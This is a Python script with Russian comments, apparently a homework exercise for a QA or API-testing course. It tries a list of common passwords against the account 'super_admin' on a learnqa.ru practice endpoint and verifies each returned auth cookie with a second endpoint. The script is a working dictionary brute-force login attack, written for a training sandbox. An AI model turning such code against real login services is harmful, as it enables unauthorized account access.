import requests

# Логин нашего коллеги
login = "super_admin"

# Список самых популярных паролей из Википедии (топ-25 SplashData)
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r",
    "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]

print(f"Начинаем подбор пароля для логина: {login}")
print(f"Всего паролей для проверки: {len(passwords)}")
print("-" * 50)

# Перебираем все пароли из списка
for password in passwords:
    print(f"Проверяем пароль: {password}")

    # 1) Вызываем первый метод для получения cookie
    url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    data = {
        "login": login,
        "password": password
    }

    try:
        response1 = requests.post(url1, data=data)

        # Получаем cookie auth_cookie из ответа
        auth_cookie = response1.cookies.get("auth_cookie")

        if auth_cookie is None:
            print("   Ошибка: cookie auth_cookie не получена")
            continue

        # 2) Проверяем cookie вторым методом
        url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
        cookies = {"auth_cookie": auth_cookie}

        response2 = requests.get(url2, cookies=cookies)
        result = response2.text

        # Проверяем ответ
        if result == "You are NOT authorized":
            print(f"Неверный пароль: {password}")
        else:
            print("-" * 50)
            print(f"УСПЕХ! Найден верный пароль!")
            print(f"Логин: {login}")
            print(f"Пароль: {password}")
            print(f"Ответ сервера: {result}")
            print("-" * 50)
            break

    except Exception as e:
        print(f"Ошибка при проверке пароля {password}: {e}")
        continue

else:
    print("-" * 50)
    print("Пароль не найден в списке популярных паролей")